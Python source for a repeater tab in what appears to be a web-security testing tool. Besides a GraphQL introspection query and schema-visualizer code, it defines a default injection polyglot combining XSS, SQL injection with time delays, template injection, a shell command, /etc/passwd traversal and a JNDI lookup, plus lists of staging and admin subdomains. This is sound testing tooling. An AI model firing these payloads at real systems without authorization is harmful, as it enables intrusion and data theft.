#!/usr/bin/env python3
"""
repeater_tab.py 
Enhanced with true parallel race condition testing and professional tab naming
"""

import re
import ssl
import json
import html
import base64
import hmac
import hashlib
import time
import socket
import urllib.parse
import gzip
import logging
import threading
import random
from typing import Optional, List, Dict, Any
from threading import Barrier, Event, Semaphore
from concurrent.futures import ThreadPoolExecutor, as_completed

from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QSplitter, QTabWidget,
    QTextEdit, QPlainTextEdit, QPushButton, QLabel, QLineEdit,
    QComboBox, QFrame, QToolBar, QAction, QMenu, QMessageBox,
    QListWidget, QListWidgetItem, QInputDialog, QCheckBox,
    QSpinBox, QGroupBox, QScrollArea, QStatusBar, QDialog,
    QDialogButtonBox, QSizePolicy, QShortcut, QApplication,
    QTableWidget, QTableWidgetItem, QHeaderView, QStackedWidget,
    QAbstractItemView
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QUrl, QSize, QRegularExpression
from PyQt5.QtGui import QFont, QColor, QTextCursor, QSyntaxHighlighter, QTextCharFormat, QTextDocument, QKeySequence, QPainter

from modules.constants import (
    COLOR_BACKGROUND, COLOR_DARK_BG, COLOR_CARD_BG, COLOR_ELEVATED_BG,
    COLOR_TEXT, COLOR_TEXT_BRIGHT, COLOR_TEXT_MUTED, COLOR_BORDER,
    COLOR_ACCENT, COLOR_SUCCESS, COLOR_CRITICAL, COLOR_HOVER,
    FONT_FAMILY_MONO, FONT_SIZE_NORMAL, FONT_SIZE_SMALL,
    HttpSyntaxHighlighter, GQLSyntaxHighlighter, JSONSyntaxHighlighter
)
from modules.inspector_card import (
    _InspectorCard,
    analyze_selection as _analyze_selection_cards,
    reencode_decoded_value,
)

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# Default polyglot payload (configurable via Tools → Set Polyglot Payload)
# ─────────────────────────────────────────────────────────────────────────────
_DEFAULT_POLYGLOT = (
    "'\"><script>alert(Inj3ct3d)</script>{{7*7}}${7*7}<%=7*7%>' OR '1'='1'-- ; ls -la #/../../../../../../etc/passwd${jndi:ldap://127.0.0.1/x}JavaScript://%250Aalert?.(1)//'/*\\'/*\\\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\""
)

_ENV_SUBDOMAIN_PREFIXES = [
    "dev","dev1","dev2","develop","development",
    "staging","stage","stg","stg1",
    "test","testing","test1","test2","test3",
    "qa","qa1","qa2","qa3",
    "uat","uat1",
    "pre","preprod","pre-prod","pre-production",
    "sandbox","sandbox1",
    "beta","alpha","demo","preview",
    "internal","int","old","legacy",
    "api-dev","api-staging","api-test",
    "api2","apiv2","api-v2",
    "admin","mgmt","management",
]

_ENV_PATH_PREFIXES = [
    "/dev","/staging","/test","/qa",
    "/api/v2","/api/v3","/api/dev",
    "/beta","/internal","/admin","/sandbox","/preview",
]



# ─────────────────────────────────────────────────────────────────────────────
# Full GraphQL introspection query
# ─────────────────────────────────────────────────────────────────────────────

_FULL_INTROSPECT_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
""".strip()


# ─────────────────────────────────────────────────────────────────────────────
# GraphQL Schema Visualizer HTML builder
# ─────────────────────────────────────────────────────────────────────────────

def _build_visualizer_html(schema_data: dict) -> str:
    import json as _json
    schema_json = _json.dumps(schema_data, ensure_ascii=False)
    schema_json = schema_json.replace('</script>', '<\\/script>')
    return r"""<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>GraphQL Schema ERD</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden}
body{background:#1e1e2e;color:#cdd6f4;font-family:'Cascadia Code','Fira Code','Consolas',monospace;display:flex;flex-direction:column}
#toolbar{background:#181825;border-bottom:1px solid #313244;padding:6px 14px;display:flex;align-items:center;gap:10px;flex-shrink:0;height:40px}
#toolbar h1{font-size:13px;color:#89b4fa;font-weight:700;white-space:nowrap}
#tb-search{background:#313244;border:1px solid #45475a;border-radius:4px;color:#cdd6f4;padding:3px 8px;font-size:11px;font-family:inherit;outline:none;width:150px}
#tb-search:focus{border-color:#89b4fa}
.stat{color:#6c7086;font-size:11px}.stat b{color:#cdd6f4;font-weight:600}
.tbtn{background:#313244;border:1px solid #45475a;border-radius:3px;color:#cdd6f4;padding:2px 8px;font-size:11px;cursor:pointer;font-family:inherit}
.tbtn:hover{background:#45475a}
#tb-hint{margin-left:auto;color:#45475a;font-size:10px}
#main{flex:1;display:flex;overflow:hidden}
#erd-wrap{flex:1;overflow:hidden;position:relative;cursor:grab;background:#1e1e2e;background-image:radial-gradient(circle,#313244 1px,transparent 1px);background-size:22px 22px}
#erd-wrap.grabbing{cursor:grabbing}
#erd-canvas{position:absolute;top:0;left:0;transform-origin:0 0}
#erd-svg{position:absolute;top:0;left:0;pointer-events:none;overflow:visible}
.tbox{position:absolute;border-radius:4px;box-shadow:0 2px 10px rgba(0,0,0,.55);min-width:200px}
.tbox:hover{z-index:5}
.tbox-hdr{padding:5px 10px;border-radius:4px 4px 0 0;display:flex;align-items:center;justify-content:center;gap:6px;cursor:move;user-select:none}
.tbox-name{font-size:12px;font-weight:700;letter-spacing:.2px}
.tbox-kind{font-size:9px;padding:1px 5px;border-radius:3px;background:rgba(0,0,0,.3);font-weight:600;letter-spacing:.4px}
.tbox-fields{border-radius:0 0 4px 4px;overflow:hidden}
.frow{padding:3px 10px;border-top:1px solid #313244;font-size:11px;white-space:nowrap;display:flex;align-items:center;gap:4px;min-height:22px}
.frow.op-field{cursor:pointer}
.frow.op-field:hover{background:#313244}
.frow.op-field:hover .fn{color:#89dceb}
.fn{color:#cdd6f4}.fsep{color:#6c7086;flex-shrink:0}.ft{color:#f9e2af}
.fargs{color:#a6e3a1;font-size:10px}
.bld-btn{margin-left:auto;font-size:9px;padding:1px 5px;background:#89b4fa1a;color:#89b4fa;border:1px solid #89b4fa55;border-radius:3px;cursor:pointer;flex-shrink:0;white-space:nowrap}
.bld-btn:hover{background:#89b4fa33}
#qb{width:0;overflow:hidden;transition:width .15s;flex-shrink:0;display:flex;flex-direction:column;background:#181825}
#qb.open{width:340px;border-left:1px solid #313244}
#qb-hdr{padding:8px 12px;background:#11111b;border-bottom:1px solid #313244;flex-shrink:0;display:flex;align-items:center;gap:8px}
#qb-title{font-size:12px;font-weight:700;color:#89dceb;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
#qb-close{background:none;border:none;color:#6c7086;font-size:18px;cursor:pointer;line-height:1;padding:0}
#qb-close:hover{color:#cdd6f4}
#qb-body{flex:1;overflow-y:auto;padding:10px;display:flex;flex-direction:column;gap:12px}
.qb-label{font-size:10px;color:#6c7086;text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px}
.qb-code{background:#1e1e2e;border:1px solid #313244;border-radius:4px;padding:8px;font-size:11px;font-family:inherit;color:#a6e3a1;white-space:pre;overflow-x:auto;line-height:1.55}
.copy-btn{align-self:flex-end;background:#313244;border:1px solid #45475a;border-radius:4px;color:#cdd6f4;padding:4px 12px;font-size:11px;cursor:pointer;font-family:inherit;margin-top:3px}
.copy-btn:hover{background:#45475a}
.copy-btn.ok{color:#a6e3a1;border-color:#a6e3a1}
.var-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px 8px;align-items:start}
.var-field{display:flex;flex-direction:column;gap:3px}
.var-label{font-size:10px;color:#89b4fa;font-family:inherit;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.var-type{font-size:9px;color:#6c7086;margin-left:2px}
.var-input{background:#1e1e2e;border:1px solid #45475a;border-radius:3px;color:#cdd6f4;padding:4px 6px;font-size:11px;font-family:inherit;outline:none;width:100%}
.var-input:focus{border-color:#89b4fa}
.var-input.bool-sel{cursor:pointer}
.var-input.invalid{border-color:#f38ba8;color:#f38ba8}
.var-json{resize:vertical;min-height:52px;grid-column:1/-1;font-size:10px;line-height:1.4;color:#f9e2af}
.vars-section{display:flex;flex-direction:column;gap:6px}
.vars-sep{border:none;border-top:1px solid #313244;margin:4px 0}
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:#181825}
::-webkit-scrollbar-thumb{background:#45475a;border-radius:3px}
</style></head>
<body>
<div id="toolbar">
  <h1>&#x2B21; GraphQL Schema ERD</h1>
  <input id="tb-search" type="text" placeholder="Filter types&#x2026;" autocomplete="off">
  <div class="stat">Types: <b id="tc">0</b></div>
  <div class="stat">Relations: <b id="rc">0</b></div>
  <button class="tbtn" id="z-fit">Fit</button>
  <button class="tbtn" id="z-in">+</button>
  <button class="tbtn" id="z-out">&#x2212;</button>
  <button class="tbtn" id="z-1">1:1</button>
  <button class="tbtn" id="dl-html" title="Download as self-contained HTML file">&#x2B07; Save HTML</button>
  <span id="tb-hint">Drag headers &#x2022; Scroll=zoom &#x2022; Click field = build query</span>
</div>
<div id="main">
  <div id="erd-wrap">
    <div id="erd-canvas"><svg id="erd-svg"></svg></div>
  </div>
  <div id="qb">
    <div id="qb-hdr">
      <span id="qb-title">Query Builder</span>
      <button id="qb-close">&#xd7;</button>
    </div>
    <div id="qb-body">
      <p style="color:#45475a;font-size:12px;text-align:center;padding:30px 0">Click a field in Query / Mutation / Subscription to build a request</p>
    </div>
  </div>
</div>
<script>
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
const KC={OBJECT:'#89b4fa',INTERFACE:'#cba6f7',UNION:'#f38ba8',ENUM:'#a6e3a1',INPUT_OBJECT:'#f9e2af',SCALAR:'#94e2d5'};
const BUILTINS=new Set(['String','Int','Float','Boolean','ID']);
const SCHEMA_DATA=/*SCHEMA_JSON*/;
const sc=SCHEMA_DATA.__schema||(SCHEMA_DATA.data&&SCHEMA_DATA.data.__schema);
if(!sc){document.body.innerHTML='<p style="padding:40px;color:#f38ba8;font-size:18px">No __schema found.</p>';throw 0;}
const rootQ=sc.queryType&&sc.queryType.name;
const rootM=sc.mutationType&&sc.mutationType.name;
const rootS=sc.subscriptionType&&sc.subscriptionType.name;
const rootTypes=new Set([rootQ,rootM,rootS].filter(Boolean));
const allT=sc.types.filter(t=>t.name&&!t.name.startsWith('__')&&!BUILTINS.has(t.name));
const tMap={};allT.forEach(t=>tMap[t.name]=t);
function getBase(tr){return tr?(tr.name||getBase(tr.ofType)):null;}
function tStr(tr,d=0){if(!tr||d>6)return'';if(tr.kind==='NON_NULL')return tStr(tr.ofType,d+1)+'!';if(tr.kind==='LIST')return'['+tStr(tr.ofType,d+1)+']';return tr.name||'?';}
function typeFields(t){return t?(t.fields||t.inputFields||[]):[];}
// BFS ranks from root types
function bfsRanks(){
  const rank={};
  const q=[...[...rootTypes].filter(n=>tMap[n])];
  q.forEach(n=>rank[n]=0);
  let head=0;
  while(head<q.length){
    const name=q[head++],t=tMap[name];if(!t)continue;
    const nr=(rank[name]||0)+1;
    for(const f of typeFields(t)){const b=getBase(f.type);if(b&&tMap[b]&&rank[b]===undefined){rank[b]=nr;q.push(b);}}
    for(const i of(t.interfaces||[])){if(tMap[i.name]&&rank[i.name]===undefined){rank[i.name]=nr;q.push(i.name);}}
    if(t.kind==='UNION')for(const p of(t.possibleTypes||[])){if(tMap[p.name]&&rank[p.name]===undefined){rank[p.name]=nr;q.push(p.name);}}
  }
  allT.forEach(t=>{if(rank[t.name]===undefined)rank[t.name]=999;});
  return rank;
}
const H_GAP=88,V_GAP=18,HDR_H=28,ROW_H=22;
const CHAR_W=7.0,ROW_PAD=44;
function computeBoxW(t){
  const flds=typeFields(t),isRt=rootTypes.has(t.name);
  let mx=t.name.length*8.5+60;
  flds.forEach(f=>{
    const argsLen=(f.args&&f.args.length)?f.args.map(a=>a.name.length+tStr(a.type).length+4).reduce((s,v)=>s+v,0)+4:0;
    mx=Math.max(mx,(f.name.length+argsLen+tStr(f.type).length+4)*CHAR_W+ROW_PAD+(isRt?55:0));
  });
  (t.enumValues||[]).forEach(v=>{mx=Math.max(mx,v.name.length*CHAR_W+ROW_PAD);});
  return Math.max(200,Math.ceil(mx));
}
function boxH(t){return HDR_H+Math.max(1,(typeFields(t).length||(t.enumValues||[]).length||1))*ROW_H;}
function layout(ranks){
  const byRank={};
  allT.forEach(t=>{const r=ranks[t.name];if(!byRank[r])byRank[r]=[];byRank[r].push(t);});
  for(const r in byRank)byRank[r].sort((a,b)=>(rootTypes.has(b.name)-rootTypes.has(a.name))||a.name.localeCompare(b.name));
  const pos={};let curX=V_GAP;
  Object.keys(byRank).map(Number).sort((a,b)=>a-b).forEach(r=>{
    let curY=V_GAP;
    const colW=Math.max(...byRank[r].map(t=>computeBoxW(t)));
    byRank[r].forEach(t=>{const h=boxH(t),w=computeBoxW(t);pos[t.name]={x:curX,y:curY,w,h};curY+=h+V_GAP;});
    curX+=colW+H_GAP;
  });
  return pos;
}
const ranks=bfsRanks();
const pos=layout(ranks);
const canvas=document.getElementById('erd-canvas');
const svg=document.getElementById('erd-svg');
let maxX=V_GAP,maxY=V_GAP;
for(const n in pos){maxX=Math.max(maxX,pos[n].x+pos[n].w+H_GAP);maxY=Math.max(maxY,pos[n].y+pos[n].h+V_GAP);}
canvas.style.width=maxX+'px';canvas.style.height=maxY+'px';
svg.setAttribute('width',maxX);svg.setAttribute('height',maxY);
svg.innerHTML=`<defs>
  <marker id="arr" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#45475a"/></marker>
  <marker id="arr-hl" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#89b4fa"/></marker>
</defs>`;
document.getElementById('tc').textContent=allT.length;
const boxes={},fieldMeta={},edgeEls=[],drawnE=new Set();
allT.forEach(t=>{
  const p=pos[t.name];if(!p)return;
  const clr=KC[t.kind]||'#6c7086',isRoot=rootTypes.has(t.name);
  const box=document.createElement('div');
  box.className='tbox';box.id='bx-'+t.name;
  box.style.cssText=`left:${p.x}px;top:${p.y}px;width:${p.w}px;border:1px solid ${clr}55`;
  const hdr=document.createElement('div');hdr.className='tbox-hdr';
  hdr.style.background=isRoot?clr+'cc':clr+'2a';
  hdr.innerHTML=`<span class="tbox-name" style="color:${isRoot?'#1e1e2e':clr}">${esc(t.name)}</span>`+
    `<span class="tbox-kind" style="color:${isRoot?'#1e1e2e':clr}">${t.kind}</span>`;
  box.appendChild(hdr);
  const fb=document.createElement('div');fb.className='tbox-fields';
  fieldMeta[t.name]=[];
  const flds=typeFields(t);
  if(flds.length){
    flds.forEach((f,fi)=>{
      const row=document.createElement('div');row.className='frow';
      const refBase=getBase(f.type),hasRef=refBase&&tMap[refBase]&&refBase!==t.name;
      if(isRoot)row.classList.add('op-field');
      const argsStr=(f.args&&f.args.length)?`<span class="fargs">(${esc(f.args.map(a=>a.name+': '+tStr(a.type)).join(', '))})</span>`:'';
      row.innerHTML=`<span class="fn">${esc(f.name)}</span>${argsStr}<span class="fsep">:</span><span class="ft">${esc(tStr(f.type))}</span>`;
      if(isRoot){
        const btn=document.createElement('button');btn.className='bld-btn';btn.textContent='Build \u25b6';
        btn.addEventListener('click',ev=>{ev.stopPropagation();buildQuery(t.name,f);});
        row.appendChild(btn);
        row.addEventListener('click',()=>buildQuery(t.name,f));
      }
      row.addEventListener('mouseenter',()=>{edgeEls.forEach(({el,src,tgt,fi:efi})=>{const h=(src===t.name&&efi===fi)||(tgt===t.name);el.setAttribute('stroke',h?'#89b4fa':'#45475a');el.setAttribute('stroke-width',h?'2':'1.2');el.setAttribute('marker-end',h?'url(#arr-hl)':'url(#arr)');});});
      row.addEventListener('mouseleave',()=>{edgeEls.forEach(({el})=>{el.setAttribute('stroke','#45475a');el.setAttribute('stroke-width','1.2');el.setAttribute('marker-end','url(#arr)');});});
      fb.appendChild(row);
      fieldMeta[t.name].push({el:row,idx:fi,refBase:hasRef?refBase:null});
      if(hasRef){
        const ek=t.name+'.'+f.name+'->'+refBase;
        if(!drawnE.has(ek)){
          drawnE.add(ek);
          const path=document.createElementNS('http://www.w3.org/2000/svg','path');
          path.setAttribute('fill','none');path.setAttribute('stroke','#45475a');
          path.setAttribute('stroke-width','1.2');path.setAttribute('marker-end','url(#arr)');
          svg.appendChild(path);
          edgeEls.push({el:path,src:t.name,tgt:refBase,fi});
        }
      }
    });
  } else {
    const vals=t.enumValues||[];
    (vals.length?vals.slice(0,14):[{name:'(no fields)'}]).forEach(v=>{
      const row=document.createElement('div');row.className='frow';
      row.style.color=vals.length?'#cdd6f4':'#45475a';row.textContent=v.name;fb.appendChild(row);
    });
  }
  box.appendChild(fb);canvas.appendChild(box);boxes[t.name]=box;
  // box drag
  let isDrag=false,dbx=0,dby=0,dpx=0,dpy=0;
  hdr.addEventListener('mousedown',e=>{
    if(e.button!==0)return;e.stopPropagation();
    isDrag=true;dpx=pos[t.name].x;dpy=pos[t.name].y;dbx=e.clientX;dby=e.clientY;
    box.style.zIndex=20;document.body.style.userSelect='none';
  });
  window.addEventListener('mousemove',e=>{
    if(!isDrag)return;
    pos[t.name].x=dpx+(e.clientX-dbx)/zoom;pos[t.name].y=dpy+(e.clientY-dby)/zoom;
    box.style.left=pos[t.name].x+'px';box.style.top=pos[t.name].y+'px';
    redrawEdges();
  });
  window.addEventListener('mouseup',()=>{if(isDrag){isDrag=false;box.style.zIndex='';document.body.style.userSelect='';}});
});
// draw + redraw edges
function edgePath(src,tgt,fi){
  const sp=pos[src],tp=pos[tgt];if(!sp||!tp)return'';
  const sy=sp.y+HDR_H+fi*ROW_H+ROW_H/2,ty=tp.y+HDR_H/2;
  const sx=sp.x+sp.w,tx=tp.x,cpx=(sx+tx)/2;
  return `M ${sx} ${sy} C ${cpx} ${sy} ${cpx} ${ty} ${tx} ${ty}`;
}
function redrawEdges(){edgeEls.forEach(({el,src,tgt,fi})=>el.setAttribute('d',edgePath(src,tgt,fi)));}
edgeEls.forEach(({el,src,tgt,fi})=>el.setAttribute('d',edgePath(src,tgt,fi)));
document.getElementById('rc').textContent=edgeEls.length;
// pan & zoom
const wrap=document.getElementById('erd-wrap');
let zoom=1,panX=0,panY=0;
function applyT(){canvas.style.transform=`translate(${panX}px,${panY}px) scale(${zoom})`;}
let panning=false,pmx=0,pmy=0;
wrap.addEventListener('mousedown',e=>{if(e.target.closest('.tbox'))return;panning=true;pmx=e.clientX;pmy=e.clientY;wrap.classList.add('grabbing');});
window.addEventListener('mousemove',e=>{if(!panning)return;panX+=e.clientX-pmx;panY+=e.clientY-pmy;pmx=e.clientX;pmy=e.clientY;applyT();});
window.addEventListener('mouseup',()=>{panning=false;wrap.classList.remove('grabbing');});
wrap.addEventListener('wheel',e=>{
  e.preventDefault();
  const f=e.deltaY<0?1.1:0.91,wr=wrap.getBoundingClientRect();
  const mx=e.clientX-wr.left,my=e.clientY-wr.top;
  const wx=(mx-panX)/zoom,wy=(my-panY)/zoom;
  zoom=Math.max(0.06,Math.min(4,zoom*f));panX=mx-wx*zoom;panY=my-wy*zoom;applyT();
},{passive:false});
document.getElementById('z-in').onclick=()=>{zoom=Math.min(4,zoom*1.2);applyT();};
document.getElementById('z-out').onclick=()=>{zoom=Math.max(.06,zoom/1.2);applyT();};
document.getElementById('z-1').onclick=()=>{zoom=1;panX=0;panY=0;applyT();};
document.getElementById('dl-html').onclick=()=>{
  const html='<!DOCTYPE html>'+document.documentElement.outerHTML;
  const blob=new Blob([html],{type:'text/html'});
  const a=document.createElement('a');a.href=URL.createObjectURL(blob);
  a.download='graphql-schema-erd.html';a.click();URL.revokeObjectURL(a.href);
};
document.getElementById('z-fit').onclick=()=>{
  const wr=wrap.getBoundingClientRect();
  zoom=Math.min(1,(wr.width-20)/(maxX||1),(wr.height-20)/(maxY||1));
  panX=(wr.width-maxX*zoom)/2;panY=10;applyT();
};
// search
document.getElementById('tb-search').addEventListener('input',e=>{
  const q=e.target.value.toLowerCase();
  Object.entries(boxes).forEach(([n,b])=>{b.style.opacity=(!q||n.toLowerCase().includes(q))?'1':'0.1';});
});
// query builder
const qbPanel=document.getElementById('qb');
document.getElementById('qb-close').onclick=()=>qbPanel.classList.remove('open');
function defVal(tr,d=0){
  if(!tr||d>4)return null;
  if(tr.kind==='NON_NULL')return defVal(tr.ofType,d+1);
  if(tr.kind==='LIST')return[];
  switch(tr.name){case'Int':return 0;case'Float':return 0.0;case'String':return'example';case'Boolean':return false;case'ID':return'1';default:return null;}
}
function selSet(typeName,depth){
  if(depth>1)return'';
  const t=tMap[typeName];if(!t)return'';
  const flds=typeFields(t);if(!flds.length)return'';
  const ind='  '.repeat(depth+2);
  return flds.map(f=>{
    const b=getBase(f.type),ft=tMap[b];
    if(ft&&typeFields(ft).length&&b!==typeName&&depth<1){
      const inner=selSet(b,depth+1);
      return inner?`${ind}${f.name} {\n${inner}\n${ind}}`:`${ind}${f.name}`;
    }
    return `${ind}${f.name}`;
  }).join('\n');
}
function buildQuery(rootTypeName,field){
  qbPanel.classList.add('open');
  const opKw=rootTypeName===rootM?'mutation':rootTypeName===rootS?'subscription':'query';
  const opName=field.name.charAt(0).toUpperCase()+field.name.slice(1);
  const retBase=getBase(field.type);
  document.getElementById('qb-title').textContent=`${opKw} ${field.name}`;
  const qbBody=document.getElementById('qb-body');
  qbBody.innerHTML='';

  // ── Variable store (live values) ──────────────────────────────────────────────
  const argList=field.args||[];
  const liveVars={};
  argList.forEach(a=>{liveVars[a.name]=defVal(a.type);});

  // ── Helper: coerce input string to correct JS type ───────────────────────────────
  function coerce(val,tr,d=0){
    if(!tr||d>4)return val;
    if(tr.kind==='NON_NULL')return coerce(val,tr.ofType,d+1);
    if(tr.kind==='LIST'){try{return JSON.parse(val);}catch(e){return val;}}
    switch(tr.name){
      case'Int':case'Float':{const n=Number(val);return isNaN(n)?val:n;}
      case'Boolean':return val==='true';
      default:return val;
    }
  }

  // ── Rebuild all output strings from current liveVars ─────────────────────────────
  function rebuild(){
    const hasArgs=argList.length>0;
    const argDefs=hasArgs?'('+argList.map(a=>`$${a.name}: ${tStr(a.type)}`).join(', ')+')':'';
    const argUse=hasArgs?'('+argList.map(a=>`${a.name}: $${a.name}`).join(', ')+')':'';
    const vars=hasArgs?Object.assign({},liveVars):null;
    const body=retBase&&tMap[retBase]?selSet(retBase,0):'';
    const fieldSel=body?` {\n${body}\n  }`:'';
    const gql=`${opKw} ${opName}${argDefs} {\n  ${field.name}${argUse}${fieldSel}\n}`;
    const jsonObj=vars?{query:gql,variables:vars}:{query:gql};
    const jsonBody=JSON.stringify(jsonObj,null,2);
    const httpLen=new Blob([jsonBody]).size;
    const httpSnip=`POST /graphql HTTP/1.1\r\nHost: <target-host>\r\nContent-Type: application/json\r\nContent-Length: ${httpLen}\r\n\r\n${jsonBody}`;
    let getQS=`query=${encodeURIComponent(gql)}&operationName=${encodeURIComponent(opName)}`;
    if(vars)getQS+=`&variables=${encodeURIComponent(JSON.stringify(vars))}`;
    const getSnip=`GET /graphql?${getQS} HTTP/1.1\r\nHost: <target-host>\r\nAccept: application/json`;
    const getUrl=`https://<target-host>/graphql?${getQS}`;
    return{gql,jsonBody,httpSnip,getSnip,getUrl};
  }

  // ── Code section helper (live-updatable pre) ────────────────────────────────────
  function mkSec(label){
    const w=document.createElement('div');
    const l=document.createElement('div');l.className='qb-label';l.textContent=label;
    const pre=document.createElement('div');pre.className='qb-code';
    const btn=document.createElement('button');btn.className='copy-btn';btn.textContent='Copy';
    btn.onclick=()=>navigator.clipboard.writeText(pre.textContent).then(()=>{btn.textContent='Copied \u2713';btn.classList.add('ok');setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('ok');},1500);});
    w.appendChild(l);w.appendChild(pre);w.appendChild(btn);
    return{el:w,pre};
  }

  // ── Variable inputs ─────────────────────────────────────────────────────────────
  if(argList.length){
    const vsec=document.createElement('div');vsec.className='vars-section';
    const vl=document.createElement('div');vl.className='qb-label';vl.textContent='Variables';
    vsec.appendChild(vl);
    const grid=document.createElement('div');grid.className='var-grid';
    argList.forEach(a=>{
      const vf=document.createElement('div');vf.className='var-field';
      const lbl=document.createElement('label');lbl.className='var-label';
      lbl.innerHTML=`${esc(a.name)} <span class="var-type">${esc(tStr(a.type))}</span>`;
      function baseTypeName(tr,d=0){if(!tr||d>4)return'String';if(tr.kind==='NON_NULL'||tr.kind==='LIST')return baseTypeName(tr.ofType,d+1);return tr.name||'String';}
      const btn=baseTypeName(a.type);
      const isEnum=tMap[btn]&&tMap[btn].kind==='ENUM';
      const isBool=btn==='Boolean';
      const isInt=btn==='Int';
      const isFloat=btn==='Float';
      const isInputObj=tMap[btn]&&(tMap[btn].kind==='INPUT_OBJECT'||tMap[btn].kind==='OBJECT');
      const isList=a.type&&a.type.kind==='LIST';
      let inp;
      if(isEnum){
        inp=document.createElement('select');inp.className='var-input bool-sel';
        const blank=document.createElement('option');blank.value='';blank.textContent='-- choose --';inp.appendChild(blank);
        (tMap[btn].enumValues||[]).forEach(ev=>{const o=document.createElement('option');o.value=ev.name;o.textContent=ev.name;if(String(liveVars[a.name])===ev.name)o.selected=true;inp.appendChild(o);});
        inp.addEventListener('change',()=>{liveVars[a.name]=inp.value||null;refresh();});
      } else if(isBool){
        inp=document.createElement('select');inp.className='var-input bool-sel';
        ['true','false'].forEach(v=>{const o=document.createElement('option');o.value=v;o.textContent=v;if(String(liveVars[a.name])===v)o.selected=true;inp.appendChild(o);});
        inp.addEventListener('change',()=>{liveVars[a.name]=inp.value==='true';refresh();});
      } else if(isInputObj||isList){
        // Input objects and lists must be JSON — render a textarea
        inp=document.createElement('textarea');inp.className='var-input var-json';
        inp.rows=3;inp.spellcheck=false;
        inp.placeholder=isList?'[ ]':'{ }';
        const dv=liveVars[a.name];
        try{inp.value=JSON.stringify(dv!==null&&dv!==undefined?dv:(isList?[]:{} ),null,2);}catch(e){inp.value='';}
        inp.addEventListener('input',()=>{
          try{liveVars[a.name]=JSON.parse(inp.value);inp.classList.remove('invalid');}
          catch(e){liveVars[a.name]=inp.value||null;inp.classList.add('invalid');}
          refresh();
        });
        // Initialize liveVars with parsed default
        try{liveVars[a.name]=JSON.parse(inp.value);}catch(e){}
      } else {
        inp=document.createElement('input');inp.className='var-input';
        inp.type=(isInt||isFloat)?'number':'text';
        if(isFloat)inp.step='any';
        const dv=liveVars[a.name];
        inp.value=(dv!==null&&dv!==undefined)?String(dv):'';
        inp.placeholder=btn==='String'?'string value':isInt?'integer':isFloat?'float':'value';
        inp.addEventListener('input',()=>{
          const coerced=coerce(inp.value,a.type);
          liveVars[a.name]=inp.value===''?null:coerced;
          inp.classList.toggle('invalid',typeof coerced==='string'&&(isInt||isFloat)&&isNaN(Number(inp.value))&&inp.value!=='');
          refresh();
        });
      }
      vf.appendChild(lbl);vf.appendChild(inp);grid.appendChild(vf);
    });
    vsec.appendChild(grid);
    const sep=document.createElement('hr');sep.className='vars-sep';
    vsec.appendChild(sep);
    qbBody.appendChild(vsec);
  }

  // ── Output sections ─────────────────────────────────────────────────────────────
  const s1=mkSec('GraphQL Query');qbBody.appendChild(s1.el);
  const s2=mkSec('Request Body (JSON)');qbBody.appendChild(s2.el);
  const s3=mkSec('Full HTTP Request (POST)');qbBody.appendChild(s3.el);
  const s4=mkSec('GET HTTP Request');qbBody.appendChild(s4.el);
  const s5=mkSec('GET URL (?query=\u2026)');qbBody.appendChild(s5.el);

  function refresh(){
    const r=rebuild();
    s1.pre.textContent=r.gql;
    s2.pre.textContent=r.jsonBody;
    s3.pre.textContent=r.httpSnip;
    s4.pre.textContent=r.getSnip;
    s5.pre.textContent=r.getUrl;
  }
  refresh();
}
window.addEventListener('load',()=>document.getElementById('z-fit').click());
</script></body></html>""".replace('/*SCHEMA_JSON*/', schema_json)


# ─────────────────────────────────────────────────────────────────────────────
# HTTP Syntax Highlighter
# ─────────────────────────────────────────────────────────────────────────────

class RepeaterSyntaxHighlighter(QSyntaxHighlighter):
    def __init__(self, document, mode="request"):
        super().__init__(document)
        self.mode = mode
        self._build_rules()

    def _fmt(self, color, bold=False):
        f = QTextCharFormat()
        f.setForeground(QColor(color))
        if bold:
            f.setFontWeight(700)
        return f

    def _build_rules(self):
        self.rules = []
        # HTTP method
        self.rules.append((re.compile(r'^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS|TRACE)\b'), self._fmt("#ff7b54", bold=True)))
        # Status line
        self.rules.append((re.compile(r'^(HTTP/\d\.\d)\s+(\d{3})'), self._fmt("#7ed56f", bold=True)))
